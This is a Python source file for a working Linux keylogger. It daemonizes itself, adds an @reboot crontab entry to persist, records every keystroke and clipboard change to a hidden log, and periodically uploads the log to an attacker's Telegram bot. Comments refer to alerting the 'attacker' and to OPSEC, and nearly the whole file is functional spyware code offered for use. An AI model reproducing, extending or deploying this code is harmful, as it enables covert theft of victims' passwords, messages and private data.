#!/usr/bin/python3

# _*_ coding: utf-8 _*_


# tested on Linux (Linux kali 6.5.0-kali2-amd64)

# to do:
# logging keystrokes of virtual keyboard


# persistence added (but not OPSEC way)


from os import system,path,environ,fork,setsid,devnull
import threading
from pynput import keyboard  #type: ignore
from datetime import datetime
from time import sleep
from requests import get,post
from random import gauss
from sys import executable,exit
import subprocess

# disable GTK warnings
try:
    environ["NO_AT_BRIDGE"] = "1"
except:
    pass

# background the process using double-forks
def daemon() -> None :
    if fork() > 0: exit(0)   # exit parent process
    setsid()                 # allows the process to run independently (bg)
    if fork() > 0: exit(0)   # exit child process
    
# clipboard 
import gi
gi.require_version('Gtk', '3.0')
from gi.repository import Gtk,Gdk
from pyperclip import paste   # for getting the clipboard data (supports cross platform)


# <-- Initializing global values -->

# change this
TOKEN = ''                     # Telegram API Token
CHAT_ID = ''                   # Telegram Chat ID
INTERVAL = 120                 # set interval according to your requirement



# no change required
FILENAME = f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.log'  # unix oriented [.19062024132058.log]


# helper functions

# to notify attacker if any shits happen
def alarm(msg) -> None :
    get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}')


# jittler
def nap(min_delay=1, max_delay=100) -> None:
    t = gauss(25, 10)
    t = max(min_delay, min(t, max_delay))
    return t


# easily detectable though (systemd would be better [root perm])
def attach() -> None:
    me = path.abspath(executable)

    try:
        existing_cron = subprocess.check_output(["crontab", "-l"], stderr=subprocess.DEVNULL).decode()
    except subprocess.CalledProcessError:
        existing_cron = ""
    

    add = f'@reboot {me}'

    if add in existing_cron:
        return
    
    cron = existing_cron.strip() + "\n" + add + "\n"
    proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
    proc.communicate(cron.encode())
    return



# (˶˃ ᵕ ˂˶)
#keystroke record
class keylogger:

    # init
    def __init__(self) -> None :
        self.duplicate = ['']


    # saving the file
    def savefile(self, data) -> None :
        try:
            with open(FILENAME, 'a+') as fh:
                fh.write(str(data))
        except Exception as e:
            alarm(f"Error saving file: {e}")
    

    def Keylogging(self) -> None :
        def on_key_press(key) -> None :
            try:
                # checks whether duplicate or not
                def IsDuplicate(data) -> bool :
                    if data and data != self.duplicate[0]:
                        self.duplicate[0] = data
                        return False
                    return True
        
                try:
                    clipboard = Gtk.Clipboard.get(Gdk.SELECTION_CLIPBOARD)
                    data = clipboard.wait_for_text()

                    if data and not IsDuplicate(data):
                        self.savefile(f'clipboard data: {data}\n')
                
                except Exception as ie:
                    alarm(f"Gtk Error: {ie}")
                    
                    # old pyperclip.paste() logic
                    try:
                        data = paste()
                        if data and not IsDuplicate(data):
                            self.savefile(f'clipboard data {data}\n')
                    except Exception as pe:
                        alarm(f"Pyperclip Error: {pe}")

            except Error as e:
                alarm(f"Error in on_key_press: {e}")

            try:
                # Keystroke logging
                self.savefile(f'{str(key)}\n')
            except Exception as e:
                alarm(f"Keystroke Logging Error: {e}")

        try:
            # Create listener objects
            with keyboard.Listener(on_press=on_key_press) as listener:
                listener.join()
        except Exception as e:
            alarm(f"Listener Error: {e}")


    # destructors
    def __del__(self) -> None :
        pass



# upload to Telegram
class uploader:
    
    #init
    def __init__(self) -> None :
        pass


    def upload_file_periodically(self) -> None :
        
        sleep(INTERVAL + nap())
        
        while True:
            try:
                if path.exists(FILENAME):
                    with open(FILENAME, 'rb') as fh:
                        files = {'document': fh}
                        resp = post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}',files=files)   # sending the file

                        if resp.status_code != 200:
                            alarm(f'Error Code: {resp.status_code}')

                else:
                    alarm(f'File not created or found: {FILENAME}')  # file not created/found

                sleep(INTERVAL + nap())

            except Exception as e:
                alarm(f'Error Occured: {e}')
    
    
    def __del__(self) -> None :
        pass





if __name__=='__main__':
    try:

        daemon()
        attach()

        # creating objects
        keylogger  = keylogger()
        uploader = uploader()

        # <---  implementing threading  ---> 
        
        # starting the keylogger and daemon = True (to run it in the background)
        keylogger_thread = threading.Thread(target = keylogger.Keylogging,daemon = True)
        keylogger_thread.start() 


        # sending file periodically and daemon = True (to run it in the background)
        uploader_thread = threading.Thread(target = uploader.upload_file_periodically, daemon = True)
        uploader_thread.start()


        keylogger_thread.join()
        uploader_thread.join()
    
    except KeyboardInterrupt:
        pass

